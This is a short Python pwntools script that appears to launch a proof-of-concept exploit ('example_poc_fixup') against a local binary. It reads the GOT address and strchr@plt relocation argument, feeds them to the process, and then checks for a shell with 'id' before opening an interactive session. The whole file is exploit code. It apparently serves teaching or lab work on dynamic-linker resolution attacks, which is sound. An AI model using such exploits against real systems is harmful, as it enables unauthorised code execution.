"""
launcher for example_poc_fixup
usage: python <target>

automatically finds GOT address and reloc_arg of strchr@plt function
"""
import sys
from pwn import *

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print 'Usage: python %s target' % sys.argv[0]
        sys.exit(0)
    _target = sys.argv[1]
    p = process(_target)
    elf = ELF(_target)

    # got address
    GOT = elf.symbols['_GLOBAL_OFFSET_TABLE_']
    # get reloc_arg from strchr@plt function - argument of push instruction
    strchr = elf.plt['strchr']
    reloc_arg = ord(elf.read(strchr, 8)[-1])

    print p.recv()
    p.sendline('{:x} {:x}'.format(GOT, reloc_arg))
    print p.recv()
    print "now we're in shell!"
    p.sendline('id')
    print 'id returns:'
    sleep(0.1)
    print p.recv()
    p.interactive()
